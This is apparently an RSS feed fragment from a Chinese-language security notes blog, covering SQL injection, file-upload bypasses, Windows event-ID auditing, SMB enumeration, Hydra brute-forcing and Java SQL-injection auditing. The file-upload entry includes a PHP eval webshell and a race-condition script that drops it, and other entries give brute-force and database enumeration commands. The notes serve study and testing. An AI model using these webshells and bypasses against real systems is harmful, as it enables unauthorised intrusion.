      <description>SQL 注入 简介 常见 SQL 版本 MySQL Oracle SQL Server PostgreSQL DB2 SQLite 常用常量 MySQL 常用函数 字符串函数 database()：显示当前数据库 user()：显示当前用户 version()：显示数据库版本 @@version_compile_os：显示操作系统版本 @@version_compile_machine：显示操作系统位数 @@datadir：显示数据库文件存放路径 @@basedir：显示数据库安装路径 @@hostname：显示数据库主机名 @@port：显示数据库端口 功能函数 GROUP_CONCAT(name)：将多个值拼接成字符串 concat(a,b)：将 a 和 b 拼接成字符串 substr(str,pos,len)：截取字符串 mid(str,pos,len)：截取字符串 left(str,len)：截取字符串 right(str,len)：截取字符串 ascii(str)：返回字符串第一个字符的 ASCII 码 sleep(5)：让数据库等待 5 秒 updatexml(xml_doument,XPath_string,new_value)：更新 XML 内容 extractvalue(xml_doument,XPath_string)：提取 XML 内容 information_schema 库 SCHEMATA 表 字段：SCHEMA_NAME&#xA;-- 获取当前数据库所有库名 SELECT SCHEMA_NAME FROM information_schema.SCHEMATA; TABLES 表 字段：TABLE_NAME（表名），TABLE_SCHEMA（表对应的库名）&#xA;-- 获取某个库的所有表名 SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = &amp;#39;xxx&amp;#39;; COLUMNS 表 字段：TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME, COLUMN_TYPE</description>
    </item>
    <item>
      <title></title>
      <link>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/http_content-type_%E5%AF%B9%E7%85%A7%E8%A1%A8/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/http_content-type_%E5%AF%B9%E7%85%A7%E8%A1%A8/</guid>
      <description>常见Content-Type对照表 文件后缀 Mime类型 说明 .flv flv/flv-flash 在线播放 .html或.htm text/html 超文本标记语言文本 .rtf application/rtf RTF文本 .gif 或.png image/gif(image/png) GIF图形/PNG图片 .jpeg或.jpg image/jpeg JPEG图形 .au audio/basic au声音文件 .mid或.midi audio/midi或audio/x-midi MIDI音乐文件 .ra或.ram或.rm audio/x-pn-realaudio RealAudio音乐文件 .mpg或.mpeg或.mp3 video/mpeg MPEG文件 .avi video/x-msvideo AVI文件 .gz application/x-gzip GZIP文件 .tar application/x-tar TAR文件 .exe application/octet-stream 下载文件类型 .rmvb video/vnd.rn-realvideo 在线播放 .txt text/plain 普通文本 .mrp application/octet-stream MRP文件（国内普遍的手机） .ipa application/iphone-package-archive IPA文件(IPHONE) .deb application/x-debian-package-archive DED文件(IPHONE) .apk application/vnd.android.package-archive APK文件(安卓系统) .cab application/vnd.cab-com-archive CAB文件(Windows Mobile) .xap application/x-silverlight-app XAP文件(Windows Phone 7) .</description>
    </item>
    <item>
      <title></title>
      <link>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</guid>
      <description>文件上传漏洞 文件上传漏洞是指用户上传了一个可执行脚本文件，并通过此文件获得了执行服务器端命令的能力。在大多数情况下，文件上传漏洞一般是指上传 WEB 脚本能够被服务器解析的问题，也就是所谓的 webshell 问题。完成这一攻击需要这样几个条件，一是上传的文件能够被 WEB 容器执行，其次用户能从 WEB 上访问这个文件，最后，如果上传的文件被安全检查、格式化、图片压缩等功能改变了内容，则可能导致攻击失败。&#xA;前端检查 控制台重构检查函数 抓包 文件后缀绕过 改为php5,php4,php3,php2,phtml,pht 大小写绕过 加空格 加点 加::$DATA 加点+空格+点+空格（deldot()删除末尾空格、trim()首尾去空） 双写 上传路径可控 上传路径+文件名拼接时，上传路径后输入保存文件名并使用 00 截断，GET：%00 截断，POST：00 截断（需要php版本小于 5.3.4，php.ini的magic_quotes_gpc为OFF状态）&#xA;Content-Type 绕过 抓包修改 Content-Type&#xA;见HTTP_content-type_对照表&#xA;文件头检测 添加文件头（GIF89a 等）&#xA;文件内容检测 参考PHP命令执行&#xA;二次渲染 测试图片的渲染后没有修改的位置，将一句话木马添加进去，这样就可以利用文件包含去执行 php 一句话木马了&#xA;对于 GIF 的上传，只需要判断没有修改的位置，然后将 php 一句话木马添加即可&#xA;对于 PNG 的上传，需要修改 PLTE 数据块或者修改 IDAT 数据块&#xA;详见 制作绕过二次渲染的图片马&#xA;条件竞争 针对上传后检测再删除的情况，可用传一个创建一个一句话木马的文件，然后不断访问，直到执行成功。&#xA;// upload &amp;lt;?php $file=fopen(&amp;#34;muma.php&amp;#34;,&amp;#34;w&amp;#34;); $string=&amp;#39;&amp;lt;?php @eval($_POST[&amp;#34;test&amp;#34;]); ?&amp;gt;&amp;#39;; fwrite($file,$string); fcolse(); ?&amp;gt; # run import requests for i in range(1000000): url=&amp;#34;xxx&amp;#34; if requests.</description>
    </item>
    <item>
      <title></title>
      <link>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/%E6%97%A5%E5%BF%97%E5%AE%A1%E8%AE%A1/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/%E6%97%A5%E5%BF%97%E5%AE%A1%E8%AE%A1/</guid>
      <description>日志审计 Windows 常用安全事件 ID 系统 1074，通过这个事件 ID 查看计算机的开机、关机、重启的时间以及原因和注释。&#xA;6005，表示计算机日志服务已启动，如果出现了事件 ID 为 6005，则表示这天正常启动了系统。&#xA;104，这个时间 ID 记录所有审计日志清除事件，当有日志被清除时，出现此事件 ID。&#xA;安全 4624，这个事件 ID 表示成功登陆的用户，用来筛选该系统的用户登陆成功情况。&#xA;4625，这个事件 ID 表示登陆失败的用户。&#xA;4720,4722,4723,4724,4725,4726,4738,4740, 事件 ID 表示当用户帐号发生创建，删除，改变密码时的事件记录。&#xA;4727,4737,4739,4762, 事件 ID 表示当用户组发生添加、删除时或组内添加成员时生成该事件。&#xA;安全事件 ID 汇总备查 EVENT_ID 安全事件信息 1100 ----- 事件记录服务已关闭 1101 ----- 审计事件已被运输中断。 1102 ----- 审核日志已清除 1104 ----- 安全日志现已满 1105 ----- 事件日志自动备份 1108 ----- 事件日志记录服务遇到错误 4608 ----- Windows 正在启动 4609 ----- Windows 正在关闭 4610 ----- 本地安全机构已加载身份验证包 4611 ----- 已向本地安全机构注册了受信任的登录进程 4612 ----- 为审计消息排队分配的内部资源已经用尽，导致一些审计丢失。 4614 ----- 安全帐户管理器已加载通知包。 4615 ----- LPC 端口使用无效 4616 ----- 系统时间已更改。 4618 ----- 已发生受监视的安全事件模式 4621 ----- 管理员从 CrashOnAuditFail 恢复了系统 4622 ----- 本地安全机构已加载安全包。 4624 ----- 帐户已成功登录 4625 ----- 帐户无法登录 4626 ----- 用户/设备声明信息 4627 ----- 集团会员信息。 4634 ----- 帐户已注销 4646 ----- IKE DoS 防护模式已启动 4647 ----- 用户启动了注销 4648 ----- 使用显式凭据尝试登录 4649 ----- 检测到重播攻击 4650 ----- 建立了 IPsec 主模式安全关联 4651 ----- 建立了 IPsec 主模式安全关联 4652 ----- IPsec 主模式协商失败 4653 ----- IPsec 主模式协商失败 4654 ----- IPsec 快速模式协商失败 4655 ----- IPsec 主模式安全关联已结束 4656 ----- 请求了对象的句柄 4657 ----- 注册表值已修改 4658 ----- 对象的句柄已关闭 4659 ----- 请求删除对象的句柄 4660 ----- 对象已删除 4661 ----- 请求了对象的句柄 4662 ----- 对对象执行了操作 4663 ----- 尝试访问对象 4664 ----- 试图创建一个硬链接 4665 ----- 尝试创建应用程序客户端上下文。 4666 ----- 应用程序尝试了一个操作 4667 ----- 应用程序客户端上下文已删除 4668 ----- 应用程序已初始化 4670 ----- 对象的权限已更改 4671 ----- 应用程序试图通过 TBS 访问被阻止的序号 4672 ----- 分配给新登录的特权 4673 ----- 特权服务被召唤 4674 ----- 尝试对特权对象执行操作 4675 ----- SID 被过滤掉了 4688 ----- 已经创建了一个新流程 4689 ----- 一个过程已经退出 4690 ----- 尝试复制对象的句柄 4691 ----- 请求间接访问对象 4692 ----- 尝试备份数据保护主密钥 4693 ----- 尝试恢复数据保护主密钥 4694 ----- 试图保护可审计的受保护数据 4695 ----- 尝试不受保护的可审计受保护数据 4696 ----- 主要令牌已分配给进程 4697 ----- 系统中安装了一项服务 4698 ----- 已创建计划任务 4699 ----- 计划任务已删除 4700 ----- 已启用计划任务 4701 ----- 计划任务已禁用 4702 ----- 计划任务已更新 4703 ----- 令牌权已经调整 4704 ----- 已分配用户权限 4705 ----- 用户权限已被删除 4706 ----- 为域创建了新的信任 4707 ----- 已删除对域的信任 4709 ----- IPsec 服务已启动 4710 ----- IPsec 服务已禁用 4711 ----- PAStore 引擎（1％） 4712 ----- IPsec 服务遇到了潜在的严重故障 4713 ----- Kerberos 策略已更改 4714 ----- 加密数据恢复策略已更改 4715 ----- 对象的审核策略（SACL）已更改 4716 ----- 可信域信息已被修改 4717 ----- 系统安全访问权限已授予帐户 4718 ----- 系统安全访问已从帐户中删除 4719 ----- 系统审核策略已更改 4720 ----- 已创建用户帐户 4722 ----- 用户帐户已启用 4723 ----- 尝试更改帐户的密码 4724 ----- 尝试重置帐户密码 4725 ----- 用户帐户已被禁用 4726 ----- 用户帐户已删除 4727 ----- 已创建启用安全性的全局组 4728 ----- 已将成员添加到启用安全性的全局组中 4729 ----- 成员已从启用安全性的全局组中删除 4730 ----- 已删除启用安全性的全局组 4731 ----- 已创建启用安全性的本地组 4732 ----- 已将成员添加到启用安全性的本地组 4733 ----- 成员已从启用安全性的本地组中删除 4734 ----- 已删除已启用安全性的本地组 4735 ----- 已启用安全性的本地组已更改 4737 ----- 启用安全性的全局组已更改 4738 ----- 用户帐户已更改 4739 ----- 域策略已更改 4740 ----- 用户帐户已被锁定 4741 ----- 已创建计算机帐户 4742 ----- 计算机帐户已更改 4743 ----- 计算机帐户已删除 4744 ----- 已创建禁用安全性的本地组 4745 ----- 已禁用安全性的本地组已更改 4746 ----- 已将成员添加到已禁用安全性的本地组 4747 ----- 已从安全性已禁用的本地组中删除成员 4748 ----- 已删除安全性已禁用的本地组 4749 ----- 已创建一个禁用安全性的全局组 4750 ----- 已禁用安全性的全局组已更改 4751 ----- 已将成员添加到已禁用安全性的全局组中 4752 ----- 成员已从禁用安全性的全局组中删除 4753 ----- 已删除安全性已禁用的全局组 4754 ----- 已创建启用安全性的通用组 4755 ----- 启用安全性的通用组已更改 4756 ----- 已将成员添加到启用安全性的通用组中 4757 ----- 成员已从启用安全性的通用组中删除 4758 ----- 已删除启用安全性的通用组 4759 ----- 创建了一个安全禁用的通用组 4760 ----- 安全性已禁用的通用组已更改 4761 ----- 已将成员添加到已禁用安全性的通用组中 4762 ----- 成员已从禁用安全性的通用组中删除 4763 ----- 已删除安全性已禁用的通用组 4764 ----- 组类型已更改 4765 ----- SID 历史记录已添加到帐户中 4766 ----- 尝试将 SID 历史记录添加到帐户失败 4767 ----- 用户帐户已解锁 4768 ----- 请求了 Kerberos 身份验证票证（TGT） 4769 ----- 请求了 Kerberos 服务票证 4770 ----- 更新了 Kerberos 服务票证 4771 ----- Kerberos 预身份验证失败 4772 ----- Kerberos 身份验证票证请求失败 4773 ----- Kerberos 服务票证请求失败 4774 ----- 已映射帐户以进行登录 4775 ----- 无法映射帐户以进行登录 4776 ----- 域控制器尝试验证帐户的凭据 4777 ----- 域控制器无法验证帐户的凭据 4778 ----- 会话重新连接到 Window Station 4779 ----- 会话已与 Window Station 断开连接 4780 ----- ACL 是在作为管理员组成员的帐户上设置的 4781 ----- 帐户名称已更改 4782 ----- 密码哈希帐户被访问 4783 ----- 创建了一个基本应用程序组 4784 ----- 基本应用程序组已更改 4785 ----- 成员已添加到基本应用程序组 4786 ----- 成员已从基本应用程序组中删除 4787 ----- 非成员已添加到基本应用程序组 4788 ----- 从基本应用程序组中删除了非成员。 4789 ----- 基本应用程序组已删除 4790 ----- 已创建 LDAP 查询组 4791 ----- 基本应用程序组已更改 4792 ----- LDAP 查询组已删除 4793 ----- 密码策略检查 API 已被调用 4794 ----- 尝试设置目录服务还原模式管理员密码 4797 ----- 试图查询帐户是否存在空白密码 4798 ----- 枚举了用户的本地组成员身份。 4799 ----- 已枚举启用安全性的本地组成员身份 4800 ----- 工作站已锁定 4801 ----- 工作站已解锁 4802 ----- 屏幕保护程序被调用 4803 ----- 屏幕保护程序被解雇了 4816 ----- RPC 在解密传入消息时检测到完整性违规 4817 ----- 对象的审核设置已更改。 4818 ----- 建议的中央访问策略不授予与当前中央访问策略相同的访问权限 4819 ----- 计算机上的中央访问策略已更改 4820 ----- Kerberos 票证授予票证（TGT）被拒绝，因为该设备不符合访问控制限制 4821 ----- Kerberos 服务票证被拒绝，因为用户，设备或两者都不符合访问控制限制 4822 ----- NTLM 身份验证失败，因为该帐户是受保护用户组的成员 4823 ----- NTLM 身份验证失败，因为需要访问控制限制 4824 ----- 使用 DES 或 RC4 进行 Kerberos 预身份验证失败，因为该帐户是受保护用户组的成员 4825 ----- 用户被拒绝访问远程桌面。默认情况下，仅当用户是 Remote Desktop Users 组或 Administrators 组的成员时才允许用户进行连接 4826 ----- 加载引导配置数据 4830 ----- SID 历史记录已从帐户中删除 4864 ----- 检测到名称空间冲突 4865 ----- 添加了受信任的林信息条目 4866 ----- 已删除受信任的林信息条目 4867 ----- 已修改受信任的林信息条目 4868 ----- 证书管理器拒绝了挂起的证书请求 4869 ----- 证书服务收到重新提交的证书请求 4870 ----- 证书服务撤销了证书 4871 ----- 证书服务收到发布证书吊销列表（CRL）的请求 4872 ----- 证书服务发布证书吊销列表（CRL） 4873 ----- 证书申请延期已更改 4874 ----- 一个或多个证书请求属性已更改。 4875 ----- 证书服务收到关闭请求 4876 ----- 证书服务备份已启动 4877 ----- 证书服务备份已完成 4878 ----- 证书服务还原已开始 4879 ----- 证书服务恢复已完成 4880 ----- 证书服务已启动 4881 ----- 证书服务已停止 4882 ----- 证书服务的安全权限已更改 4883 ----- 证书服务检索到存档密钥 4884 ----- 证书服务将证书导入其数据库 4885 ----- 证书服务的审核筛选器已更改 4886 ----- 证书服务收到证书请求 4887 ----- 证书服务批准了证书请求并颁发了证书 4888 ----- 证书服务拒绝了证书请求 4889 ----- 证书服务将证书请求的状态设置为挂起 4890 ----- 证书服务的证书管理器设置已更改。 4891 ----- 证书服务中的配置条目已更改 4892 ----- 证书服务的属性已更改 4893 ----- 证书服务存档密钥 4894 ----- 证书服务导入并存档了一个密钥 4895 ----- 证书服务将 CA 证书发布到 Active Directory 域服务 4896 ----- 已从证书数据库中删除一行或多行 4897 ----- 启用角色分离 4898 ----- 证书服务加载了一个模板 4899 ----- 证书服务模板已更新 4900 ----- 证书服务模板安全性已更新 4902 ----- 已创建每用户审核策略表 4904 ----- 尝试注册安全事件源 4905 ----- 尝试取消注册安全事件源 4906 ----- CrashOnAuditFail 值已更改 4907 ----- 对象的审核设置已更改 4908 ----- 特殊组登录表已修改 4909 ----- TBS 的本地策略设置已更改 4910 ----- TBS 的组策略设置已更改 4911 ----- 对象的资源属性已更改 4912 ----- 每用户审核策略已更改 4913 ----- 对象的中央访问策略已更改 4928 ----- 建立了 Active Directory 副本源命名上下文 4929 ----- 已删除 Active Directory 副本源命名上下文 4930 ----- 已修改 Active Directory 副本源命名上下文 4931 ----- 已修改 Active Directory 副本目标命名上下文 4932 ----- 已开始同步 Active Directory 命名上下文的副本 4933 ----- Active Directory 命名上下文的副本的同步已结束 4934 ----- 已复制 Active Directory 对象的属性 4935 ----- 复制失败开始 4936 ----- 复制失败结束 4937 ----- 从副本中删除了一个延迟对象 4944 ----- Windows 防火墙启动时，以下策略处于活动状态 4945 ----- Windows 防火墙启动时列出了规则 4946 ----- 已对 Windows 防火墙例外列表进行了更改。增加了一条规则 4947 ----- 已对 Windows 防火墙例外列表进行了更改。规则被修改了 4948 ----- 已对 Windows 防火墙例外列表进行了更改。规则已删除 4949 ----- Windows 防火墙设置已恢复为默认值 4950 ----- Windows 防火墙设置已更改 4951 ----- 规则已被忽略，因为 Windows 防火墙无法识别其主要版本号 4952 ----- 已忽略规则的某些部分，因为 Windows 防火墙无法识别其次要版本号 4953 ----- Windows 防火墙已忽略规则，因为它无法解析规则 4954 ----- Windows 防火墙组策略设置已更改。已应用新设置 4956 ----- Windows 防火墙已更改活动配置文件 4957 ----- Windows 防火墙未应用以下规则 4958 ----- Windows 防火墙未应用以下规则，因为该规则引用了此计算机上未配置的项目 4960 ----- IPsec 丢弃了未通过完整性检查的入站数据包 4961 ----- IPsec 丢弃了重放检查失败的入站数据包 4962 ----- IPsec 丢弃了重放检查失败的入站数据包 4963 ----- IPsec 丢弃了应该受到保护的入站明文数据包 4964 ----- 特殊组已分配给新登录 4965 ----- IPsec 从远程计算机收到一个包含不正确的安全参数索引（SPI）的数据包。 4976 ----- 在主模式协商期间，IPsec 收到无效的协商数据包。 4977 ----- 在快速模式协商期间，IPsec 收到无效的协商数据包。 4978 ----- 在扩展模式协商期间，IPsec 收到无效的协商数据包。 4979 ----- 建立了 IPsec 主模式和扩展模式安全关联。 4980 ----- 建立了 IPsec 主模式和扩展模式安全关联 4981 ----- 建立了 IPsec 主模式和扩展模式安全关联 4982 ----- 建立了 IPsec 主模式和扩展模式安全关联 4983 ----- IPsec 扩展模式协商失败 4984 ----- IPsec 扩展模式协商失败 4985 ----- 交易状态已发生变化 5024 ----- Windows 防火墙服务已成功启动 5025 ----- Windows 防火墙服务已停止 5027 ----- Windows 防火墙服务无法从本地存储中检索安全策略 5028 ----- Windows 防火墙服务无法解析新的安全策略。 5029 ----- Windows 防火墙服务无法初始化驱动程序 5030 ----- Windows 防火墙服务无法启动 5031 ----- Windows 防火墙服务阻止应用程序接受网络上的传入连接。 5032 ----- Windows 防火墙无法通知用户它阻止应用程序接受网络上的传入连接 5033 ----- Windows 防火墙驱动程序已成功启动 5034 ----- Windows 防火墙驱动程序已停止 5035 ----- Windows 防火墙驱动程序无法启动 5037 ----- Windows 防火墙驱动程序检测到严重的运行时错 终止 5038 ----- 代码完整性确定文件的图像哈希无效 5039 ----- 注册表项已虚拟化。 5040 ----- 已对 IPsec 设置进行了更改。添加了身份验证集。 5041 ----- 已对 IPsec 设置进行了更改。身份验证集已修改 5042 ----- 已对 IPsec 设置进行了更改。身份验证集已删除 5043 ----- 已对 IPsec 设置进行了更改。添加了连接安全规则 5044 ----- 已对 IPsec 设置进行了更改。连接安全规则已修改 5045 ----- 已对 IPsec 设置进行了更改。连接安全规则已删除 5046 ----- 已对 IPsec 设置进行了更改。添加了加密集 5047 ----- 已对 IPsec 设置进行了更改。加密集已被修改 5048 ----- 已对 IPsec 设置进行了更改。加密集已删除 5049 ----- IPsec 安全关联已删除 5050 ----- 尝试使用对 INetFwProfile.</description>
    </item>
    <item>
      <title></title>
      <link>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/2.%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/motd/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/2.%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/motd/</guid>
      <description>motd </description>
    </item>
    <item>
      <title></title>
      <link>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/2.%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/mysql/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/2.%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/mysql/</guid>
      <description>MySQL服务安全 MySQL命令 mysql -u &amp;lt;user&amp;gt; -p </description>
    </item>
    <item>
      <title></title>
      <link>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/2.%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/redis/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/2.%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/redis/</guid>
      <description>Redis https://blog.csdn.net/qq_48201589/article/details/136760062&#xA;https://www.freebuf.com/articles/web/289231.html</description>
    </item>
    <item>
      <title></title>
      <link>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/2.%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/smb/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/2.%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/smb/</guid>
      <description>smb smb 版本探测 use auxiliary/scanner/smb/smb_version set RHOSTS 192.168.112.38 run smbmap smbmap -H smbclient 使用 Smbclient 是一个用于连接 SMB 服务的客户端工具，可以用于在渗透测试中枚举和访问共享文件、资源和服务。Smbclient 的使用方法如下：&#xA;可以使用 smbclient 命令来连接 SMB 服务，其基本语法是： smbclient //[host]/[share] -U [user] 其中，[host] 是目标主机的 IP 地址或主机名，[share] 是要访问的共享名，[user] 是要使用的用户名，如果不指定，则默认为 guest。 例如，如果要以 guest 用户连接到 192.168.1.100 主机的 public 共享，可以使用以下命令： smbclient //192.168.1.100/public -U guest 如果要以指定的密码连接，可以在用户名后加上%符号和密码，例如： smbclient //192.168.1.100/public -U guest%123456 连接成功后，会进入一个类似于 FTP 的交互式 shell，可以使用一些常用的命令来操作共享文件和资源，例如： ls：列出当前目录下的文件和子目录 cd：切换目录 get：下载文件到本地 put：上传文件到远程 mget：批量下载文件 mput：批量上传文件 del：删除文件 mkdir：创建目录 rmdir：删除目录 exit：退出 smbclient 如果不知道目标主机的共享名，可以使用-L 选项来列出所有可用的共享，其语法是： smbclient -L [host] -U [user] 例如，如果要以 guest 用户列出 192.</description>
    </item>
    <item>
      <title></title>
      <link>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/2.%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/vnc/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/2.%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/vnc/</guid>
      <description>VNC 密码解密 https://github.com/frizb/PasswordDecrypts</description>
    </item>
    <item>
      <title></title>
      <link>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/2.%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/webdav/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/2.%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/webdav/</guid>
      <description>webdav davtest davtest -url &amp;lt;url&amp;gt; -auth &amp;lt;user&amp;gt;:&amp;lt;pass&amp;gt;&#xA;列出权限和可上传或执行文件类型&#xA;cadaver cadaver &amp;lt;url&amp;gt;&#xA;webdav 客户端</description>
    </item>
    <item>
      <title></title>
      <link>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/3.fuzz/fuzz/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/3.fuzz/fuzz/</guid>
      <description>FUZZ </description>
    </item>
    <item>
      <title></title>
      <link>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/3.fuzz/%E7%88%86%E7%A0%B4%E5%B7%A5%E5%85%B7/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/3.fuzz/%E7%88%86%E7%A0%B4%E5%B7%A5%E5%85%B7/</guid>
      <description>爆破工具 hydra（账户爆破，速度更快） Supported services adam6500 asterisk cisco cisco-enable cobaltstrike cvs firebird ftp[s] http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] memcached mongodb mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp 示例 爆破POST登录表单&#xA;hydra -l [用户名] -P [密码列表文件] [目标IP] http-post-form &amp;#34;[登录页面路径]:[请求体]&amp;amp;[成功/失败条件]&amp;#34; 其中：&#xA;-l 代表登录名。 -P 代表密码列表文件路径。 [登录页面路径] 是表单提交的路径。 [请求体] 是 POST 请求的主体，通常包括用户名和密码字段，格式为 username=^USER^&amp;amp;password=^PASS^，其中 ^USER^ 和 ^PASS^ 是 Hydra 的占位符。 [成功/失败条件] 根据登录成功或失败的页面响应来定义。</description>
    </item>
    <item>
      <title></title>
      <link>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/4.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A1/codeql-java/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/4.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A1/codeql-java/</guid>
      <description>CodeQL-Java 语法：https://codeql.github.com/docs/codeql-language-guides/codeql-library-for-java/&#xA;Class Tree Element Package CompilationUnit Type PrimitiveType boolean byte char double float int long short void &amp;lt;nulltype&amp;gt; Reftype Class Interface EnumType Array Method Constructor Variable </description>
    </item>
    <item>
      <title></title>
      <link>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/4.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A1/sql%E6%B3%A8%E5%85%A5/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/4.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A1/sql%E6%B3%A8%E5%85%A5/</guid>
      <description>Java审计-SQL注入 三种数据库模式 JDBC：Java Database Connectivity，Java数据库连接，是一种用于执行SQL语句的Java API，可以为多种关系数据库提供统一访问，它由一组用Java语言编写的类和接口组成。&#xA;Mybatis（最常用）：MyBatis是一个优秀的持久层框架，它对jdbc的操作数据库的过程进行封装，使开发者只需要关注 SQL 本身，而不需要花费精力去处理例如注册驱动、创建connection、创建statement、手动设置参数、结果集检索等jdbc繁杂的过程代码。&#xA;Hibernate：Hibernate是一个开放源代码的对象关系映射框架，它对JDBC进行了非常轻量级的对象封装，它将POJO与数据库表建立映射关系，是一个全自动的orm框架，hibernate可以自动生成SQL语句，自动执行，使得Java程序员可以使用面向对象的思维来操纵数据库。&#xA;判断是否出现注入 原生JDBC是否存在直接拼接SQL语句（使用+，或者使用StringBUilder append()），未经过预编译； Mybatis使用${}； Hibernate、JPA默认是经过预编译的，但是如果开发自己编写的SQL语句，也需要进行检查； Java是强类型语言，当注入参数为long、int等数字类型时无法进行注入； 找到危险函数位置之后，向上搜索，找函数、方法调用位置，直到请求入口（controller层），判断是否存在无害化处理、无害化处理是否严格； 参考：https://mp.weixin.qq.com/s/9t3t6qxosGsKiXMIRtMoPw&#xA;判断使用的数据库模式 看项目说明使用的技术框架 看引用中加载那些技术框架 看配置源码中相关配置文件 入口确定 是否使用预编译技术，预编译是否完整。 定位SQL语句上下文，查看是否有参数直接拼接，是否有对模糊查询关键字的过滤。 Mybatis框架则搜索${}，四种情况无法预编译：like模糊查询、order by排序、范围查询in、动态表名/列名，只能拼接，所以还是需要手工防注入，此时可查看相关逻辑是否正确。 JPA搜索JpaSort.unsafe()，查看是否用实体之外的字段对查询结果排序，进行了SQL的拼接。以及查看EntityManager的使用，也可能存在拼接SQL的情况。 Statement createStatement PrepareStatement like &#39;%${ in(${ in (${ select update insert delete ${ order by setObject( setInt( setString( setSQLXML( createQuery( createSQLQuery( createNativeQuery &amp;hellip;&amp;hellip;. 案例1-非框架JDBC-Jfinal_cms论坛系统 https://github.com/jflyfox/jfinal_cms 